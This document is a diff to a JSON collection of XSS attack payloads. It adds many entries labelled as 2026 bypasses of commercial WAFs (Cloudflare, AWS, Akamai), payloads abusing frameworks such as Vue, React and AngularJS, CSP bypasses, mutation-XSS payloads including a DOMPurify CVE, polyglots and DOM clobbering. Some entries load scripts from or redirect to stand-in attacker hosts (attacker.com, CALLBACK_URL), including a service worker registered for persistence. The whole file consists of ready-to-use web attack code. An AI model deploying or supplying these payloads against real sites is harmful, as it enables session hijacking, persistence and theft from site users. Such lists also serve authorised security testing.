           "description": "Register malicious service worker for persistence",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["blind", "serviceworker"],
+          "tags": [
+            "blind",
+            "serviceworker"
+          ],
           "payload": "navigator.serviceWorker.register('http://CALLBACK_URL/sw.js').then(()=>fetch('http://CALLBACK_URL/registered'))",
           "requires_callback": true
         }
@@ -461,42 +795,211 @@
         {
           "name": "Cloudflare Bypass",
           "description": "Specific technique to bypass Cloudflare WAF",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["waf", "cloudflare"],
+          "tags": [
+            "waf",
+            "cloudflare"
+          ],
           "payload": "<svg/onload=alert(1)//>"
         },
         {
           "name": "ModSecurity Bypass",
           "description": "Bypass ModSecurity CRS rules",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["waf", "modsecurity"],
+          "tags": [
+            "waf",
+            "modsecurity"
+          ],
           "payload": "<img src=1 onerror=alert(1)>"
         },
         {
           "name": "AWS WAF Bypass",
           "description": "Technique to bypass AWS WAF",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["waf", "aws"],
+          "tags": [
+            "waf",
+            "aws"
+          ],
           "payload": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
         },
         {
           "name": "Akamai Bypass",
           "description": "Bypass Akamai Kona Site Defender",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["waf", "akamai"],
+          "tags": [
+            "waf",
+            "akamai"
+          ],
           "payload": "<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>"
         },
         {
           "name": "Imperva Bypass",
           "description": "Bypass Imperva SecureSphere WAF",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["waf", "imperva"],
+          "tags": [
+            "waf",
+            "imperva"
+          ],
           "payload": "<svg><script>alert&#40;1&#41;</script>"
+        },
+        {
+          "name": "Cloudflare \u2014 Entity Padding",
+          "description": "HTML entity with excessive zero-padding bypasses Cloudflare regex",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "cloudflare",
+            "2026"
+          ],
+          "payload": "<svg onload=prompt%26%230000000040document.domain)>"
+        },
+        {
+          "name": "Cloudflare \u2014 Tab Splitting",
+          "description": "Tab and newline characters in javascript: URI bypass Cloudflare",
+          "contexts": [
+            "url",
+            "attribute"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "cloudflare",
+            "2026"
+          ],
+          "payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>"
+        },
+        {
+          "name": "Cloudflare \u2014 Optional Chaining",
+          "description": "JS optional chaining syntax not in Cloudflare signatures",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "cloudflare",
+            "2026"
+          ],
+          "payload": "<svg onx=() onload=window.alert?.()>"
+        },
+        {
+          "name": "Cloudflare \u2014 Import Expression",
+          "description": "Dynamic import() bypasses script-src inline blocks",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "cloudflare",
+            "2026"
+          ],
+          "payload": "<img src=x onError=import('//attacker.com/')>"
+        },
+        {
+          "name": "Cloudflare \u2014 Double URL Encode",
+          "description": "Double URL encoding slips past Cloudflare's single-decode check",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "cloudflare",
+            "encoding",
+            "2026"
+          ],
+          "payload": "<--%253cimg%20onerror=alert(1)%20src=a%253e --!>"
+        },
+        {
+          "name": "Cloudflare \u2014 Ignored Attribute Prefix",
+          "description": "Invalid attribute before real event handler confuses parser",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "cloudflare",
+            "2026"
+          ],
+          "payload": "<svg on =i onload=alert(domain)>"
+        },
+        {
+          "name": "AWS WAF \u2014 Popover API",
+          "description": "onbeforetoggle not in OWASP CRS \u2014 bypasses AWS WAF managed rules",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "aws",
+            "popover",
+            "2026"
+          ],
+          "payload": "<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>"
+        },
+        {
+          "name": "AWS WAF \u2014 Content Visibility",
+          "description": "CSS-triggered event not in any WAF ruleset",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "aws",
+            "2026"
+          ],
+          "payload": "<xss oncontentvisibilityautostatechange=alert(1) style=\"display:block;content-visibility:auto\">"
+        },
+        {
+          "name": "Akamai \u2014 SrcDoc Injection",
+          "description": "Akamai doesn't deeply inspect srcdoc attribute HTML entities",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "akamai",
+            "2026"
+          ],
+          "payload": "<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>"
+        },
+        {
+          "name": "Akamai \u2014 SVG Animate",
+          "description": "SVG animatetransform onbegin bypasses Akamai event blocklist",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "waf",
+            "akamai",
+            "svg",
+            "2026"
+          ],
+          "payload": "<svg><animatetransform onbegin=alert(1)>"
         }
       ]
     },
@@ -507,41 +1010,67 @@
         {
           "name": "Chrome Extension Bypass",
           "description": "Bypass Chrome extension content security",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["browser", "chrome"],
+          "tags": [
+            "browser",
+            "chrome"
+          ],
           "payload": "chrome.runtime.sendMessage('', {}, alert)"
         },
         {
           "name": "Firefox moz-extension",
           "description": "Firefox extension protocol abuse",
-          "contexts": ["url"],
+          "contexts": [
+            "url"
+          ],
           "severity": "medium",
-          "tags": ["browser", "firefox"],
+          "tags": [
+            "browser",
+            "firefox"
+          ],
           "payload": "moz-extension://alert(1)"
         },
         {
           "name": "Safari WebKit Bypass",
           "description": "WebKit specific payload for Safari",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["browser", "safari"],
+          "tags": [
+            "browser",
+            "safari"
+          ],
           "payload": "Object.defineProperty(window,'alert',{get:function(){return alert}}); alert(1)"
         },
         {
           "name": "Internet Explorer VBScript",
           "description": "VBScript execution in Internet Explorer",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["browser", "ie", "vbscript"],
+          "tags": [
+            "browser",
+            "ie",
+            "vbscript"
+          ],
           "payload": "<script language=\"vbscript\">alert(1)</script>"
         },
         {
           "name": "Edge Legacy Bypass",
           "description": "Legacy Edge specific vulnerability",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "low",
-          "tags": ["browser", "edge"],
+          "tags": [
+            "browser",
+            "edge"
+          ],
           "payload": "window.external.AddFavorite('javascript:alert(1)','XSS')"
         }
       ]
@@ -553,42 +1082,535 @@
         {
           "name": "React dangerouslySetInnerHTML",
           "description": "Bypass React's XSS protection via dangerouslySetInnerHTML",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["framework", "react"],
+          "tags": [
+            "framework",
+            "react"
+          ],
           "payload": "React.createElement('div',{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}})"
         },
         {
           "name": "Angular $sce.trustAsHtml",
           "description": "Bypass Angular's Strict Contextual Escaping",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["framework", "angular"],
+          "tags": [
+            "framework",
+            "angular"
+          ],
           "payload": "$sce.trustAsHtml('<script>alert(1)</script>')"
         },
         {
           "name": "Vue v-html Directive",
           "description": "Abuse Vue.js v-html directive for XSS",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["framework", "vue"],
+          "tags": [
+            "framework",
+            "vue"
+          ],
           "payload": "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>"
         },
         {
           "name": "jQuery .html() Method",
           "description": "Bypass jQuery's basic escaping with .html()",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["framework", "jquery"],
+          "tags": [
+            "framework",
+            "jquery"
+          ],
           "payload": "$('<div>').html('<img src=x onerror=alert(1)>').appendTo('body')"
         },
         {
           "name": "Ember.js SafeString",
           "description": "Abuse Ember.js SafeString for XSS execution",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["framework", "ember"],
+          "tags": [
+            "framework",
+            "ember"
+          ],
           "payload": "Ember.String.htmlSafe('<script>alert(1)</script>')"
+        },
+        {
+          "name": "Vue 3 \u2014 Teleport XSS",
+          "description": "Vue teleport moves decoded HTML to script element \u2014 becomes executable",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "vue",
+            "teleport",
+            "2026"
+          ],
+          "payload": "<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport>"
+        },
+        {
+          "name": "Vue 3 \u2014 Emit Constructor Chain",
+          "description": "Access Function constructor via $emit in Vue 3 template expressions",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "vue",
+            "template",
+            "2026"
+          ],
+          "payload": "{{$emit.constructor`alert(1)`()}}"
+        },
+        {
+          "name": "Vue \u2014 Dynamic Component Script",
+          "description": "Shortest Vue XSS (23 chars) \u2014 is= resolves to script element",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "vue",
+            "component",
+            "2026"
+          ],
+          "payload": "<x is=script src=//attacker.com>"
+        },
+        {
+          "name": "Vue \u2014 mXSS Attribute Parsing",
+          "description": "Vue decodes attributes and removes invalid names \u2014 entities become live HTML",
+          "contexts": [
+            "attribute"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "vue",
+            "mxss",
+            "2026"
+          ],
+          "payload": "<x title\"=\"&lt;iframe&Tab;onload&Tab;=alert(1)&gt;\">"
+        },
+        {
+          "name": "Vue \u2014 Event Composed Path",
+          "description": "Traverse to window via composedPath in Vue event handler",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "vue",
+            "event",
+            "2026"
+          ],
+          "payload": "<img src @error=\"e=$event.composedPath().pop().alert(1)\">"
+        },
+        {
+          "name": "React \u2014 javascript: in href",
+          "description": "React doesn't block javascript: URIs in href attributes",
+          "contexts": [
+            "attribute"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "react",
+            "2026"
+          ],
+          "payload": "<a href=\"javascript:alert(document.domain)\">Click</a>"
+        },
+        {
+          "name": "AngularJS \u2014 Constructor Chain (Post-Sandbox)",
+          "description": "AngularJS 1.6+ removed sandbox \u2014 direct constructor access",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "framework",
+            "angular",
+            "template",
+            "2026"
+          ],
+          "payload": "{{constructor.constructor('alert(1)')()}}"
+        }
+      ]
+    },
+    "csp_bypass": {
+      "name": "CSP Bypass Payloads",
+      "description": "Payloads designed to bypass Content Security Policy restrictions \u2014 the primary modern XSS defense",
+      "payloads": [
+        {
+          "name": "JSONP Callback Abuse",
+          "description": "Abuse JSONP endpoints on whitelisted domains to execute arbitrary callbacks",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "csp",
+            "jsonp",
+            "2026"
+          ],
+          "payload": "<script src=\"https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1\"></script>"
+        },
+        {
+          "name": "AngularJS Script Gadget",
+          "description": "Load AngularJS from whitelisted CDN and eval templates \u2014 bypasses script-src",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "csp",
+            "angular",
+            "gadget",
+            "2026"
+          ],
+          "payload": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"
+        },
+        {
+          "name": "Object Data URI",
+          "description": "Use object element with data URI when object-src is missing from CSP",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "csp",
+            "data-uri",
+            "object",
+            "2026"
+          ],
+          "payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>"
+        },
+        {
+          "name": "IFrame SrcDoc CSP Inherit",
+          "description": "srcdoc creates new document context that may inherit weaker CSP",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "csp",
+            "iframe",
+            "srcdoc",
+            "2026"
+          ],
+          "payload": "<iframe srcdoc='<script src=\"data:text/javascript,alert(document.domain)\"></script>'></iframe>"
+        },
+        {
+          "name": "Base Tag Hijack",
+          "description": "Inject base tag to redirect relative script URLs to attacker domain",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "csp",
+            "base",
+            "2026"
+          ],
+          "payload": "<base href=\"https://attacker.com/\"><script src=\"/payload.js\"></script>"
+        },
+        {
+          "name": "Meta Refresh JavaScript",
+          "description": "Meta refresh to javascript: URI \u2014 works when meta-src not restricted",
+          "contexts": [
+            "html"
+          ],
+          "severity": "medium",
+          "tags": [
+            "csp",
+            "meta",
+            "2026"
+          ],
+          "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
+        },
+        {
+          "name": "CSP Header Injection",
+          "description": "When CSP header reflects user input, inject permissive directives",
+          "contexts": [
+            "url"
+          ],
+          "severity": "high",
+          "tags": [
+            "csp",
+            "injection",
+            "2026"
+          ],
+          "payload": "/?csp=; script-src * 'unsafe-inline';&xss=<script>alert(1)</script>"
+        }
+      ]
+    },
+    "mxss": {
+      "name": "Mutation XSS (mXSS)",
+      "description": "Exploit browser HTML parser quirks where sanitized HTML mutates into executable JS during DOM insertion",
+      "payloads": [
+        {
+          "name": "DOMPurify SVG Desc (CVE-2025-26791)",
+          "description": "DOMPurify regex fails on template literals in SVG desc \u2014 executes after mutation",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "mxss",
+            "dompurify",
+            "svg",
+            "cve",
+            "2026"
+          ],
+          "payload": "<svg><desc>\\onload=${alert(1337)}</desc></svg>"
+        },
+        {
+          "name": "DOMPurify Noscript Recontextualization",
+          "description": "noscript contents treated as text during sanitization, re-evaluated as HTML on insertion",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "mxss",
+            "dompurify",
+            "noscript",
+            "2026"
+          ],
+          "payload": "<noscript><img src=x onerror=alert(1)></noscript>"
+        },
+        {
+          "name": "MathML Namespace Confusion (Chrome)",
+          "description": "mglyph switches namespaces \u2014 style tag text becomes live HTML after mutation",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "mxss",
+            "mathml",
+            "chrome",
+            "2026"
+          ],
+          "payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">"
+        },
+        {
+          "name": "MathML Namespace Confusion (Firefox)",
+          "description": "Firefox CDATA variant of the MathML namespace confusion mXSS",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "mxss",
+            "mathml",
+            "firefox",
+            "2026"
+          ],
+          "payload": "<math><mtext><table><mglyph><style><![CDATA[</style><img title=\"]]><img src=1 onerror=alert(1)>\">"
+        },
+        {
+          "name": "Textarea Raw Text Mutation",
+          "description": "Textarea rawtext contents re-evaluated as HTML in re-contextualization",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "mxss",
+            "textarea",
+            "2026"
+          ],
+          "payload": "<textarea><img src=x onerror=alert(1)></textarea>"
+        },
+        {
+          "name": "SVG ForeignObject Mutation",
+          "description": "foreignObject switches from SVG to HTML namespace \u2014 enables tag injection",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "mxss",
+            "svg",
+            "foreignobject",
+            "2026"
+          ],
+          "payload": "<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>"
+        }
+      ]
+    },
+    "polyglot": {
+      "name": "Polyglot XSS Payloads",
+      "description": "Universal payloads that execute across multiple injection contexts \u2014 HTML, attribute, JavaScript, URL",
+      "payloads": [
+        {
+          "name": "0xsobky Ultimate Polyglot",
+          "description": "Works in HTML, attribute, JS string, and closes style/title/textarea/script contexts",
+          "contexts": [
+            "html",
+            "attribute",
+            "script",
+            "css"
+          ],
+          "severity": "high",
+          "tags": [
+            "polyglot",
+            "universal",
+            "2026"
+          ],
+          "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>"
+        },
+        {
+          "name": "Brutelogic 2025 Polyglot",
+          "description": "Multi-context polyglot with optional chaining and contentEditable autofocus",
+          "contexts": [
+            "html",
+            "attribute",
+            "script",
+            "url"
+          ],
+          "severity": "high",
+          "tags": [
+            "polyglot",
+            "universal",
+            "2026"
+          ],
+          "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//>"
+        },
+        {
+          "name": "s0md3v Compact Polyglot",
+          "description": "Short polyglot \u2014 closes script, breaks attributes, unicode bypass",
+          "contexts": [
+            "html",
+            "attribute",
+            "script"
+          ],
+          "severity": "high",
+          "tags": [
+            "polyglot",
+            "compact",
+            "2026"
+          ],
+          "payload": "-->'\"/</ sCript><svG x=\">\" onload=(co\\u006efirm)``>"
+        },
+        {
+          "name": "Attribute Context Polyglot",
+          "description": "Works in both single and double quoted attribute contexts plus JS",
+          "contexts": [
+            "attribute",
+            "script"
+          ],
+          "severity": "high",
+          "tags": [
+            "polyglot",
+            "attribute",
+            "2026"
+          ],
+          "payload": "\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"
+        },
+        {
+          "name": "Multi-Quote JS Breakout",
+          "description": "Breaks out of single, double, and template literal JS strings",
+          "contexts": [
+            "script"
+          ],
+          "severity": "high",
+          "tags": [
+            "polyglot",
+            "javascript",
+            "2026"
+          ],
+          "payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+        }
+      ]
+    },
+    "dom_clobbering": {
+      "name": "DOM Clobbering Payloads",
+      "description": "Override JavaScript variables via HTML elements \u2014 bypass sanitizers that allow id/name attributes",
+      "payloads": [
+        {
+          "name": "Form Name Clobbering",
+          "description": "Overwrite window.config via named form element \u2014 redirect auth flows",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "dom-clobbering",
+            "form",
+            "2026"
+          ],
+          "payload": "<form name=\"authConfig\" data-next=\"https://attacker.com/\" data-append=\"true\"></form>"
+        },
+        {
+          "name": "Anchor Double-ID HTMLCollection",
+          "description": "Two anchors with same ID create HTMLCollection \u2014 .name resolves to href payload",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "dom-clobbering",
+            "anchor",
+            "2026"
+          ],
+          "payload": "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">"
+        },
+        {
+          "name": "Image Name Clobbering",
+          "description": "Override global variable with image element \u2014 src becomes the value",
+          "contexts": [
+            "html"
+          ],
+          "severity": "medium",
+          "tags": [
+            "dom-clobbering",
+            "image",
+            "2026"
+          ],
+          "payload": "<img name=currentUser src=attacker-controlled-value>"
+        },
+        {
+          "name": "Embed toString Clobbering",
+          "description": "Embed element's toString returns src \u2014 clobber variables used in string context",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "dom-clobbering",
+            "embed",
+            "2026"
+          ],
+          "payload": "<embed name=injectable src=\"data:text/html,<script>alert(1)</script>\">"
+        },
+        {
+          "name": "Form + Input Chain Clobbering",
+          "description": "Access nested properties: window.form.property via form > input[name=property]",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "dom-clobbering",
+            "chain",
+            "2026"
+          ],
+          "payload": "<form id=config><input name=apiUrl value=https://attacker.com/api><input name=debug value=true></form>"
         }
       ]
     }
